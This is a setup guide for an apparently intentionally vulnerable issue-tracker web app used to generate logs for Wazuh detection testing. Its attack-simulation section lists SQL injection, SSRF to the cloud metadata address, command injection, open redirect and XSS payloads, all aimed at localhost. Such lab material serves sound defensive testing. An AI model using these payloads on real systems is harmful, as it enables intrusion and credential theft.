# Setup Guide

## Linux / Ubuntu setup
```bash
sudo apt update
sudo apt install -y python3 python3-venv python3-pip
python3 -m venv venv
source venv/bin/activate
pip install -r requirements.txt
uvicorn app.main:app --host 0.0.0.0 --port 8000
```

## Run on port 8000
Application URL: `http://127.0.0.1:8000`

## Logs
- Access log: `logs/access.log`
- Error log: `logs/error.log`

## Wazuh integration example
Configure localfile ingestion in agent config:
```xml
<localfile>
  <log_format>syslog</log_format>
  <location>/workspace/vulnissuetracker/logs/access.log</location>
</localfile>
<localfile>
  <log_format>syslog</log_format>
  <location>/workspace/vulnissuetracker/logs/error.log</location>
</localfile>
```

## Attack simulations
### curl examples
```bash
# SQLi login bypass
curl -X POST http://127.0.0.1:8000/login -d "username=' OR 1=1 --&password=x" -i

# SSRF
curl "http://127.0.0.1:8000/fetch?url=http://169.254.169.254/latest/meta-data/"

# Command injection
curl "http://127.0.0.1:8000/cmd?cmd=id"

# Open redirect
curl -I "http://127.0.0.1:8000/redirect?next=https://evil.example"
```

### Browser examples
- Visit `/issues?q="><script>alert(1)</script>` for reflected XSS testing.
- Add `<script>alert(document.cookie)</script>` as issue comment for stored XSS.
- Browse `/#<img src=x onerror=alert(1)>` on home for DOM XSS.
- Access `/admin` and `/superadmin` as unauthenticated user.
